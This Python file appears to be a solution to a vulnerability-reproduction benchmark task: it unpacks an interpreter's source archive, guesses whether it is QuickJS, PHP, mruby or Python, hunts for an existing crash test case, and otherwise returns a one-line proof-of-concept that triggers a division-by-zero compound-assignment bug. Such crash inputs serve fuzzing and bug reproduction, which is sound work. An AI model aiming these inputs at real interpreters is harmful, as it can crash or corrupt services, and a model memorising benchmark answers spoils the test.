import os
import re
import tarfile
import zipfile
import tempfile
from typing import Optional, Tuple, List


def _is_archive(path: str) -> bool:
    if os.path.isdir(path):
        return False
    low = path.lower()
    return low.endswith((".tar", ".tar.gz", ".tgz", ".tar.xz", ".txz", ".tar.bz2", ".tbz2", ".zip"))


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    base = os.path.abspath(path)
    for member in tar.getmembers():
        member_path = os.path.abspath(os.path.join(path, member.name))
        if not member_path.startswith(base + os.sep) and member_path != base:
            continue
        tar.extract(member, path)


def _extract_archive(src_path: str) -> Tuple[str, Optional[tempfile.TemporaryDirectory]]:
    if os.path.isdir(src_path):
        return os.path.abspath(src_path), None

    td = tempfile.TemporaryDirectory()
    out_dir = td.name

    low = src_path.lower()
    if low.endswith(".zip"):
        with zipfile.ZipFile(src_path, "r") as zf:
            for info in zf.infolist():
                name = info.filename
                if name.startswith("/") or ".." in name.split("/"):
                    continue
                zf.extract(info, out_dir)
    else:
        with tarfile.open(src_path, "r:*") as tf:
            _safe_extract_tar(tf, out_dir)

    # If extracted into a single top-level directory, use that as root
    try:
        entries = [e for e in os.listdir(out_dir) if e not in (".", "..")]
        if len(entries) == 1:
            candidate = os.path.join(out_dir, entries[0])
            if os.path.isdir(candidate):
                return os.path.abspath(candidate), td
    except Exception:
        pass

    return os.path.abspath(out_dir), td


def _read_small(path: str, max_bytes: int = 256 * 1024) -> Optional[bytes]:
    try:
        st = os.stat(path)
        if st.st_size > max_bytes:
            return None
        with open(path, "rb") as f:
            return f.read()
    except Exception:
        return None


def _iter_files(root: str, prefer_dirs: Optional[List[str]] = None, max_files: int = 4000) -> List[str]:
    roots = []
    if prefer_dirs:
        for d in prefer_dirs:
            p = os.path.join(root, d)
            if os.path.isdir(p):
                roots.append(p)
    roots.append(root)

    seen = set()
    out = []
    for r in roots:
        for dirpath, dirnames, filenames in os.walk(r):
            # prune common large/unhelpful dirs
            base = os.path.basename(dirpath)
            if base in (".git", ".svn", ".hg", "node_modules", "build", "out", "dist", "__pycache__"):
                dirnames[:] = []
                continue
            dirnames[:] = [d for d in dirnames if d not in (".git", ".svn", ".hg", "node_modules", "__pycache__", "build", "out", "dist")]

            for fn in filenames:
                fp = os.path.join(dirpath, fn)
                if fp in seen:
                    continue
                seen.add(fp)
                out.append(fp)
                if len(out) >= max_files:
                    return out
    return out


def _detect_language_by_harness(root: str) -> Optional[str]:
    prefer = ["fuzz", "fuzzer", "fuzzers", "oss-fuzz", "tests", "test", "tools", "contrib"]
    files = _iter_files(root, prefer_dirs=prefer, max_files=2500)
    c_like = [p for p in files if p.lower().endswith((".c", ".cc", ".cpp", ".h", ".hpp"))]
    for p in c_like:
        data = _read_small(p, max_bytes=256 * 1024)
        if not data:
            continue
        if b"LLVMFuzzerTestOneInput" not in data and b"fuzz" not in os.path.basename(p).lower().encode():
            continue

        dlow = data.lower()
        if b"js_newruntime" in dlow or b"js_eval" in dlow or b"quickjs" in dlow:
            return "js"
        if b"zend_eval_stringl" in dlow or b"php_request_startup" in dlow or b"sapi_startup" in dlow:
            return "php"
        if b"mrb_open" in dlow or b"mrb_load_nstring" in dlow or b"mruby" in dlow:
            return "ruby"
        if b"pyrun_simplestring" in dlow or b"pyrun_stringflags" in dlow:
            return "python"
    return None


def _detect_language_by_layout(root: str) -> Optional[str]:
    # Quick checks by common files/dirs
    paths = _iter_files(root, prefer_dirs=["."], max_files=1200)
    base_names = {os.path.basename(p).lower() for p in paths}
    dir_entries = set()
    try:
        dir_entries = {d.lower() for d in os.listdir(root)}
    except Exception:
        pass

    if "quickjs.c" in base_names or "quickjs.h" in base_names:
        return "js"
    if "zend" in dir_entries or "sapi" in dir_entries or "zend" in base_names:
        if "zend_execute.c" in base_names or "zend_vm_execute.h" in base_names:
            return "php"
        return "php"
    if "mruby.h" in base_names or "mruby" in dir_entries:
        return "ruby"
    if "python" in dir_entries and ("configure" in base_names or "pyconfig.h" in base_names):
        return "python"
    return None


def _extract_phpt_file_section(phpt_bytes: bytes) -> Optional[bytes]:
    # Extract --FILE-- section if present
    try:
        text = phpt_bytes.decode("utf-8", errors="replace").splitlines(True)
    except Exception:
        return None
    start = None
    for i, line in enumerate(text):
        if line.strip() == "--FILE--":
            start = i + 1
            break
    if start is None:
        return None
    end = None
    for j in range(start, len(text)):
        if text[j].startswith("--") and text[j].strip().endswith("--"):
            end = j
            break
    section = "".join(text[start:end]).encode("utf-8", errors="ignore")
    section = section.strip()
    if not section:
        return None
    return section + b"\n"


def _score_candidate_poc(lang: str, data: bytes, path: str) -> int:
    # Higher score is better
    score = 0
    size = len(data)
    if size == 0:
        return -10**9
    if size > 4096:
        return -10**6

    dlow = data.lower()
    name = os.path.basename(path).lower()

    # Must resemble script or input
    if lang == "js":
        if b"/=" in dlow and (b"0n" in dlow or re.search(rb"/=\s*0n", dlow)):
            score += 5000
        if b"bigint" in dlow or b"0n" in dlow or b"1n" in dlow:
            score += 800
        if b"try" in dlow and b"catch" in dlow:
            score += 700
        if name.endswith(".js"):
            score += 300
    elif lang == "php":
        if b"/=" in dlow and b"0" in dlow:
            score += 3000
        if b"<?php" in dlow:
            score += 800
        if b"try" in dlow and b"catch" in dlow:
            score += 300
        if name.endswith(".php"):
            score += 300
        if name.endswith(".phpt"):
            score += 200
    elif lang == "ruby":
        if b"/=" in dlow and b"0" in dlow:
            score += 2000
        if b"begin" in dlow and b"rescue" in dlow:
            score += 700
        if name.endswith(".rb"):
            score += 300
    else:
        if b"/=" in dlow and b"0" in dlow:
            score += 500

    # Prefer filenames hinting repro
    if any(k in name for k in ("poc", "repro", "crash", "uaf", "asan", "regress", "testcase")):
        score += 600

    # Prefer small
    score -= size * 2
    return score


def _find_existing_poc(root: str, lang: str) -> Optional[bytes]:
    prefer = ["poc", "pocs", "repro", "repros", "regress", "tests", "test", "corpus", "fuzz", "fuzzer", "oss-fuzz"]
    files = _iter_files(root, prefer_dirs=prefer, max_files=4500)

    exts = {
        "js": (".js", ".mjs", ".txt", ".in"),
        "php": (".php", ".phpt", ".txt", ".in"),
        "ruby": (".rb", ".txt", ".in"),
        "python": (".py", ".txt", ".in"),
        "unknown": (".txt", ".in", ".dat", ".bin"),
    }
    allowed = exts.get(lang, exts["unknown"])

    best = None
    best_score = -10**9

    for p in files:
        pl = p.lower()
        if not pl.endswith(allowed):
            continue
        data = _read_small(p, max_bytes=32 * 1024)
        if not data:
            continue
        if pl.endswith(".phpt"):
            extracted = _extract_phpt_file_section(data)
            if extracted:
                data2 = extracted
                sc = _score_candidate_poc(lang, data2, p)
                if sc > best_score:
                    best = data2
                    best_score = sc
            continue

        sc = _score_candidate_poc(lang, data, p)
        if sc > best_score:
            best = data
            best_score = sc

    # Basic sanity: must include "/=" for this bug description, otherwise likely unrelated
    if best and (b"/=" in best):
        return best if best.endswith(b"\n") else best + b"\n"
    return None


def _make_js_poc() -> bytes:
    return b"var a=1n<<200n;try{a/=0n}catch(e){};a+1n\n"


def _make_php_poc() -> bytes:
    # Keep division-by-zero non-fatal; catch in case it throws
    return b'<?php $a=str_repeat("A",2);try{$a/=0;}catch(Throwable $e){}echo $a; ?>\n'


def _make_ruby_poc() -> bytes:
    return b"a=1<<200;begin;a/=0;rescue;end;a+1\n"


class Solution:
    def solve(self, src_path: str) -> bytes:
        root, td = _extract_archive(src_path)
        try:
            lang = _detect_language_by_harness(root)
            if not lang:
                lang = _detect_language_by_layout(root)
            if not lang:
                lang = "js"

            poc = _find_existing_poc(root, lang)
            if poc:
                return poc

            if lang == "php":
                return _make_php_poc()
            if lang == "ruby":
                return _make_ruby_poc()
            return _make_js_poc()
        finally:
            if td is not None:
                td.cleanup()